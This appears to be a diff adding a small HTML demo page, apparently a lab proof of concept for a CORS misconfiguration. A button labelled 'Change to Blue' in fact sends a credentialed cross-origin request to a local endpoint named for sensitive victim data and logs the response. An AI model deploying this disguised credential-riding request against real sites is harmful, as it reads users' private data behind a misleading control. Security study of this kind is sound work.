@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+    <script>
+        function changeColor() {
+            var req = new XMLHttpRequest();
+            req.onload = reqListener;
+            req.open('get','http://localhost:8000/sensitive-victim-data-with-cors',true);
+            req.withCredentials = true;
+            req.send();
+            function reqListener() {
+                var jsonResponse = JSON.parse(this.responseText);
+
+                // Log the parsed JSON object to the console
+                console.log(jsonResponse);
+
+
+            };
+
+        }
+    </script>
+
+    <head>
+        <meta charset="UTF-8">
+        <title>Hello!</title>
+    </head>
+
+    <body>
+        <h1>Hello World!</h1>
+        <p>This is a simple paragraph.</p>
+
+        <div>
+            <button onclick="changeColor()">Change to Blue</button>
+        </div>
+    
+    </body>
+
+</html>
